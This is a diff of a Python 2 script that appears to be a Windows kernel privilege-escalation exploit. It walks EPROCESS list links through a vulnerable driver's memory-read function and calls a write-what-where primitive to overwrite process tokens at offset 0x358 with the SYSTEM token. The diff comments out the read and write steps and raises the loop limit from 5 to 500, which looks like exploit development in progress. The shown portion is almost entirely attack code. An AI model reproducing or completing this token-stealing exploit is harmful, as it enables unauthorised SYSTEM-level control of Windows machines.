@@ -318,20 +318,21 @@ def executeOverwrite():
             print "backEPROCESS is: " + hex(backEPROCESS)
             print "Finding next link from that offset..."
 
-            ptr_forwardEPROCESS = readValueatAddress(driver, backEPROCESS, USER_ADDR_OFFSET)
-            deref_ptr_forwardEPROCESS = readValueatAddress(driver, ptr_forwardEPROCESS+02e8, USER_ADDR_OFFSET)
-            forwardEPROCESS = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+            ##ptr_forwardEPROCESS = readValueatAddress(driver, backEPROCESS, USER_ADDR_OFFSET)
+            #deref_ptr_forwardEPROCESS = readValueatAddress(driver, ptr_forwardEPROCESS+02e8, USER_ADDR_OFFSET)
+            #forwardEPROCESS = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
 
-            print "Forward link is: " + hex(forwardEPROCESS)
+            #print "Forward link is: " + hex(forwardEPROCESS)
 
-            where=forwardEPROCESS+0x358
-            writeWhatWhere(driver, system_token_value, where)
+            #where=forwardEPROCESS+0x358
+            #print "forwardEPROCESS token offset: " + hex(where)
+            #writeWhatWhere(driver, system_token_value, forwardEPROCESS)
             total_writes = total_writes + 1
 
-            backEPROCESS = forwardEPROCESS
+            #backEPROCESS = forwardEPROCESS
             
 
-            if total_writes > 5:
+            if total_writes > 500:
                 break
             
 
